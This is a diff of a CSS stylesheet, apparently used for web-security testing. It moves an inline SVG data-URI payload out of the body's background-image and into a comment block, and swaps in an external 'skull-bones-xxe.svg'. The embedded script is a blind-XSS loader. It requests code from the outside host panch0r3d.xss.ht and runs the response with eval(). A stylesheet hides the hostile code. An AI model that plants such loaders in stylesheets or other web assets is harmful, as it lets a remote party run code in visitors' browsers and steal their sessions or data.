@@ -25,12 +25,13 @@
 html::after {
   content: url(https://panch0r3d.github.io/svg/skull-bones-xxe.svg);
 }
+url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10'><linearGradient id='gradient'><stop offset='10%' stop-color='%23F00'/><stop offset='90%' stop-color='%23fcc'/> </linearGradient><rect fill='url(%23gradient)' x='0' y='0' width='100%' height='100%'/><script type="text/javascript"> function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//panch0r3d.xss.ht");a.send(); </script></svg>");
 **************************************************************************/
 
 body { display:inline; } 
 
 body { background-image: 
-        url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10'><linearGradient id='gradient'><stop offset='10%' stop-color='%23F00'/><stop offset='90%' stop-color='%23fcc'/> </linearGradient><rect fill='url(%23gradient)' x='0' y='0' width='100%' height='100%'/><script type="text/javascript"> function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//panch0r3d.xss.ht");a.send(); </script></svg>");
+        url("https://panch0r3d.github.io/svg/skull-bones-xxe.svg");
       }
 
 span::after {
